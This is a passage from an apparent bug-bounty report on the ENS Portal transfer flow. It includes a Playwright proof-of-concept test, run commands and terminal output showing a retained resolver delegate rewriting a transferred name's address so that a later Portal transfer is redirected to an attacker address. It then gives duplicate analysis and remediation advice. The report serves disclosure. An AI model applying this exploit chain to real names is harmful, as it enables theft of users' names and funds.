    // parent ROLE_SET_RESOLVER. Portal exposes and executes detach before transfer.
    const controlName = await makeName({
      label: 'poc-xfer-detach-control',
      owner: 'user',
      records: [{ key: 'description', value: 'XFER-AUTH-L1 control name' }],
    })
    const controlLabel = labelFromEthName(controlName)
    const controlResolver = await readResolver(controlLabel)
    const controlResource = computeResolverResource(
      namehash(controlName),
      zeroHash,
    )
    await waitForSuccess(
      await grantResolverRoles(sellerWallet, {
        resolverAddress: controlResolver,
        targetAccount: attacker,
        scope: 'name',
        name: controlName,
        roles: ['ROLE_SET_ADDR'],
      }),
    )
    await waitForSuccess(
      await revokeResolverRoles(sellerWallet, {
        resolverAddress: controlResolver,
        targetAccount: seller,
        scope: 'root',
        roles: ['ROLE_SET_ADDR'],
      }),
    )
    const controlStateBefore = await readNameState(controlLabel)
    const controlSellerCanSetResolver = await hasRoles(publicClient, {
      registryAddress: ETH_REGISTRY,
      label: controlLabel,
      roles: ['ROLE_SET_RESOLVER'],
      account: seller,
    })
    const controlAttackerRegistryBefore = await readRegistryRoles(
      controlLabel,
      attacker,
    )
    const controlAttackerRoleBefore = await hasRoles(publicClient, {
      resolverAddress: controlResolver,
      resource: controlResource,
      roles: ['ROLE_SET_ADDR'],
      account: attacker,
    })
    expect(controlSellerCanSetResolver).toBe(true)
    expect(controlAttackerRegistryBefore).toBe(0n)
    expect(controlAttackerRoleBefore).toBe(true)

    await openTransferForm(page, controlName, recipient, recipient)
    const detachSwitch = page.getByRole('switch', {
      name: 'Detach the resolver',
    })
    await expect(detachSwitch).toBeVisible({ timeout: 30_000 })
    await expect(detachSwitch).toBeChecked()
    const controlTransferButton = page.getByRole('button', {
      name: 'Transfer name',
    })
    await expect(controlTransferButton).toBeEnabled({ timeout: 30_000 })

    const controlStartBlock = await publicClient.getBlockNumber()
    await controlTransferButton.click()
    await driveTransactionsToSuccess(page, wallet, [
      `transfer-${controlName}-detach-resolver`,
      `transfer-${controlName}-transfer-token`,
    ])
    const controlTransactions = await findRegistryTransactions({
      fromBlock: controlStartBlock,
      from: seller,
      expected: 2,
    })
    const controlTransfer = decodeTransfer(controlTransactions)
    const controlDetach = findDetachResolver(controlTransactions)
    if (!controlDetach || controlDetach.blockNumber === null) {
      throw new Error('Control resolver-detach transaction was not mined')
    }
    if (controlTransfer.transaction.blockNumber === null) {
      throw new Error('Control transfer transaction was not mined')
    }
    expect(
      controlDetach.blockNumber <= controlTransfer.transaction.blockNumber,
    ).toBe(true)

    const controlStateAfter = await readNameState(controlLabel)
    const controlResolverAfter = await readResolver(controlLabel)
    const controlAttackerRegistryAfter = await readRegistryRoles(
      controlLabel,
      attacker,
    )
    const controlAttackerRoleAfter = await hasRoles(publicClient, {
      resolverAddress: controlResolver,
      resource: controlResource,
      roles: ['ROLE_SET_ADDR'],
      account: attacker,
    })
    expect(isAddressEqual(controlStateAfter.latestOwner, recipient)).toBe(true)
    expect(isAddressEqual(controlResolverAfter, zeroAddress)).toBe(true)
    expect(controlAttackerRegistryAfter).toBe(0n)
    expect(controlAttackerRoleAfter).toBe(true)

    const staleControlWriteHash = await setRecords(attackerWallet, {
      name: controlName,
      resolverAddress: controlResolver,
      coins: [{ coin: 'ETH', value: attackAddress }],
    })
    await waitForSuccess(staleControlWriteHash)
    const staleControlDirect = await readEthAddress(
      controlResolver,
      controlName,
    )
    const controlUniversal = await getAddressRecord(universalResolverClient, {
      name: controlName,
      coin: 'ETH',
    }).catch(() => null)
    expect(isAddressEqual(staleControlDirect, attackAddress)).toBe(true)
    expect(controlUniversal).toBeNull()

    console.log('[XFER-AUTH-L1] CONTROL')
    console.log('  Detach the resolver visible: true')
    console.log('  Detach the resolver default enabled: true')
    console.log(`  detach transaction: ${controlDetach.hash}`)
    console.log(`  transfer transaction: ${controlTransfer.transaction.hash}`)
    console.log(
      `  owner before/after: ${controlStateBefore.latestOwner} -> ${controlStateAfter.latestOwner}`,
    )
    console.log(
      `  resolver before/after: ${controlResolver} -> ${controlResolverAfter}`,
    )
    console.log(
      `  A registry roles before/after: ${controlAttackerRegistryBefore}/${controlAttackerRegistryAfter}`,
    )
    console.log(
      `  A resolver ROLE_SET_ADDR before/after: ${controlAttackerRoleBefore}/${controlAttackerRoleAfter}`,
    )
    console.log(`  old R direct addr after A write: ${staleControlDirect}`)
    console.log(
      `  UniversalResolver after stale old-R write: ${controlUniversal}`,
    )

    // In-scope consumer: B enters the name it now owns as the recipient for a
    // separate real Portal transfer. Portal resolves N to A's record and encodes
    // that attacker-controlled address into safeTransferFrom.
    const downstreamName = await makeName({
      label: 'poc-xfer-resolution-consumer',
      owner: 'user2',
      records: [
        {
          key: 'description',
          value: 'XFER-AUTH-L1 downstream recipient consumer',
        },
      ],
    })
    const downstreamLabel = labelFromEthName(downstreamName)
    const downstreamStateBefore = await readNameState(downstreamLabel)
    await wallet.changeAccounts([accounts.getPrivateKey('user2')])
    await expect(
      page.getByRole('button', {
        name: new RegExp(`Wallet menu for.*${recipient.slice(-3)}`, 'i'),
      }),
    ).toBeVisible({ timeout: 30_000 })

    await openTransferForm(page, downstreamName, name, attackAddress)
    const downstreamTransferButton = page.getByRole('button', {
      name: 'Transfer name',
    })
    await expect(downstreamTransferButton).toBeEnabled({ timeout: 30_000 })
    const downstreamStartBlock = await publicClient.getBlockNumber()
    await downstreamTransferButton.click()
    await driveTransactionsToSuccess(page, wallet, [
      `transfer-${downstreamName}-detach-resolver`,
      `transfer-${downstreamName}-transfer-token`,
    ])
    const downstreamTransactions = await findRegistryTransactions({
      fromBlock: downstreamStartBlock,
      from: recipient,
      expected: 2,
    })
    const downstreamTransfer = decodeTransfer(downstreamTransactions)
    const downstreamReceipt = await publicClient.getTransactionReceipt({
      hash: downstreamTransfer.transaction.hash,
    })
    const [downstreamFrom, downstreamTo, downstreamTokenId] =
      downstreamTransfer.args
    const downstreamStateAfter = await readNameState(downstreamLabel)

    expect(isAddressEqual(downstreamFrom, recipient)).toBe(true)
    expect(isAddressEqual(downstreamTo, attackAddress)).toBe(true)
    expect(downstreamTokenId).toBe(downstreamStateBefore.tokenId)
    expect(downstreamReceipt.status).toBe('success')
    expect(
      isAddressEqual(downstreamStateAfter.latestOwner, attackAddress),
    ).toBe(true)

    console.log('[XFER-AUTH-L1] PORTAL DOWNSTREAM CONSUMER')
    console.log(`  name M: ${downstreamName}`)
    console.log(`  M owner before: ${downstreamStateBefore.latestOwner}`)
    console.log(`  entered recipient string: ${name}`)
    console.log(`  Portal-resolved address shown: ${attackAddress}`)
    console.log(`  transaction: ${downstreamTransfer.transaction.hash}`)
    console.log('  function: safeTransferFrom')
    console.log(`  decoded sender: ${downstreamFrom}`)
    console.log(`  decoded recipient: ${downstreamTo}`)
    console.log(`  status: ${downstreamReceipt.status}`)
    console.log(`  M owner after: ${downstreamStateAfter.latestOwner}`)
    console.log('[XFER-AUTH-L1] CONFIRMED')
    console.log(
      '  Portal silently retained A-writable R during S -> B, A changed B’s active resolution, and a later Portal transfer resolved entered name N to ATTACK_ADDR and encoded it as recipient.',
    )
  })
})
```

## How to run the PoC

From project root, run:

```powershell
pnpm --filter @ens-apps/e2e exec playwright test \
  projects/portal/tests/poc-transfer-hidden-resolver-authority.spec.ts \
  --config=projects/portal/playwright.config.ts \
  --workers=1
```

Result:

```
1 passed (2.5m)
```

Relevant terminal confirmations:

```
[XFER-AUTH-L1] HONEST-SELLER PORTAL UI
  Detach the resolver rendered: false
  retained-resolver warning rendered: false
  transfer button enabled: true

[XFER-AUTH-L1] POST-TRANSFER AUTHORITY
  N owner: 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
  active resolver: 0xc3220aC894c9DF08914a770b91390f93D772b2CF
  A owns N: false
  A registry role bitmap: 0
  A parent ROLE_SET_RESOLVER: false
  A resolver ROLE_SET_ADDR: true

[XFER-AUTH-L1] INDEPENDENT POST-TRANSFER ATTACK
  signer A: 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
  status: success
  owner remains B: 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
  direct resolver addr(60): 0x90F79bf6EB2c4f870365E785982E1f101E93b906
  UniversalResolver: 0x90F79bf6EB2c4f870365E785982E1f101E93b906

[XFER-AUTH-L1] PORTAL DOWNSTREAM CONSUMER
  entered recipient string: poc-xfer-hidden-resolver-1788088390.eth
  Portal-resolved address shown: 0x90F79bf6EB2c4f870365E785982E1f101E93b906
  decoded recipient: 0x90F79bf6EB2c4f870365E785982E1f101E93b906
  status: success
  M owner after: 0x90F79bf6EB2c4f870365E785982E1f101E93b906
```

## Security-model note

The report does not claim that ENSv2 should automatically revoke every previously delegated resolver role on token transfer. Delegated resolver authority is an intentional contract semantic.

The security boundary being reported is narrower: Portal has a dedicated transfer cleanup designed to sever the old resolver from the transferred name, defaults that cleanup on when the seller can perform it, and warns when the user deliberately retains the resolver. When the seller lacks the direct role for that same cleanup, Portal silently removes both the cleanup and its retention warning while still allowing the transfer.

That application behavior is what turns an otherwise legitimate pre-transfer delegation into effective authority over the new owner's active name.

## Known-issue and duplicate analysis

### QA-01

QA-01 publicly discloses that certain transfer role combinations can cause errors in later profile-record and primary-name actions.

This report does not claim those errors.

The demonstrated result is:

```
ownership transfer succeeds
→ independent non-owner retains effective authority through the still-active resolver
→ accepted post-transfer resolver mutation succeeds
→ UniversalResolver returns attacker-controlled address
→ Portal consumes that resolution as a transaction recipient
→ real ownership transfer is submitted to attacker-controlled address
```

The live competition scope explicitly distinguishes known QA functional/UX breakage from a demonstrated security consequence of that behavior. It also permits new consequences of a listed root cause when they materially change severity.

Therefore this finding remains a distinct security report even if ENS considers the hidden cleanup behavior part of the same broader transfer-role family as QA-01.

### WEB-1257

WEB-1257 discloses a retained **subregistry** after a parent transfer, with the functional consequence that the previous owner cannot set a retained subname as primary.

This report concerns:

```
PermissionedResolver, not UserRegistry/subregistry
independent resolver delegate, not the former owner suffering an error
accepted post-transfer addr(60) mutation
attacker-controlled UniversalResolver result
Portal transaction redirected to attacker-controlled address
```

Both may be related to the broader transfer-cleanup family, but WEB-1257 does not disclose this Critical resolver-authority consequence. The competition's known-issue rules expressly leave materially more severe security consequences in scope.

### WEB-1305

WEB-1305 concerns a V2-role transfer to a V1 name that remains pending.

Here:

```
ENSv2 ownership transfer succeeds
B becomes owner
A subsequently performs an accepted resolver mutation
```

There is no V1 target, protocol mismatch, or indefinitely pending transfer.

### contracts-v2 issue #418

The public contracts-v2 issue #418 has a different root and authority domain.

That issue concerns third-party roles stored in the **parent PermissionedRegistry** surviving `_update()`, allowing the delegate to later call parent-registry `setResolver` or `setSubregistry`.

This finding does not require that behavior.

The PoC proves A has:

```
parent-registry bitmap = 0
parent ROLE_SET_RESOLVER = false
```

before and after transfer.

A acts only through:

```
name-scoped PermissionedResolver ROLE_SET_ADDR
```

on the resolver that Portal left attached.

The roots are therefore:

```
#418:
smart-contract role-transfer behavior
→ parent PermissionedRegistry role survives
→ attacker replaces/reattaches resolver or subregistry

this report:
Portal cleanup/visibility logic
→ existing PermissionedResolver remains attached
→ independent resolver-local delegate writes it directly
```

The ENS smart-contract root in #418 is out of scope for this competition; the root reported here is in the in-scope Explorer app.

## Out-of-scope review

This finding does not depend on any of the Websites and Apps exclusions.

### ENS smart contracts are not the reported root

The PoC uses the local ENSv2 contracts as the real execution environment, but it does not report a contract defect.

The vulnerable decision is in the in-scope Portal/Explorer source:

```
useTransferDetachTargets.ts
SendNameForm.tsx
```

The contracts merely accept permissions that Portal knowingly leaves effective by keeping the resolver attached.

### Not theoretical

The PoC demonstrates:

```
successful ownership transfer
successful post-transfer resolver write
real UniversalResolver result
real downstream Portal resolution
real decoded transaction recipient
successful unintended name transfer
```

### Normal application workflows

The user actions are normal Portal flows:

```
transfer an ENSv2 name
enter another ENS name as a transfer recipient
approve the generated wallet transactions
```

The exploit does not require unprompted or abnormal in-app actions.

### Not UI/UX-only

The terminal effects are persistent blockchain state changes:

```
B becomes owner of N
A changes N's active addr(60)
M is subsequently transferred to ATTACK_ADDR
```

The hidden control/warning is the application root, not the terminal impact.

### No browser/plugin dependency

No browser bug, extension defect, XSS, CSP bypass, or local-network condition is required.

### PoC test file is evidence, not the vulnerable asset

The finding does not claim an impact in `e2e/`.

The E2E test only demonstrates the vulnerability in production Portal code.

## Recommended remediation

Do not use cleanup **visibility** as the decision for whether cleanup is safe to omit.

The application should distinguish:

```
target does not exist
```

from:

```
target exists but current owner cannot perform the required cleanup
```

For an active resolver:

```
if no resolver exists:
    no detach step is needed

if resolver exists and seller can detach:
    show the detach option and default it on

if resolver exists and seller cannot detach:
    do not silently set detachResolver = false
```

The safest behavior is to fail closed and block the transfer until the resolver can be detached or the authority configuration is otherwise made safe.

At minimum, the transfer must not proceed through the same path as "no resolver exists." If ENS intentionally supports transfer with an undetachable resolver, Portal should require an explicit, informed acknowledgement that the resolver will remain active and that existing resolver delegates can retain record-write authority.

A structural fix would separate:

```
hasResolver
canDetachResolver
userChoseToRetainResolver
```

rather than collapsing all three into:

```
optionIsVisible.detachResolver
```

and `canStart` should reject an unresolved active-cleanup condition instead of silently masking it out.
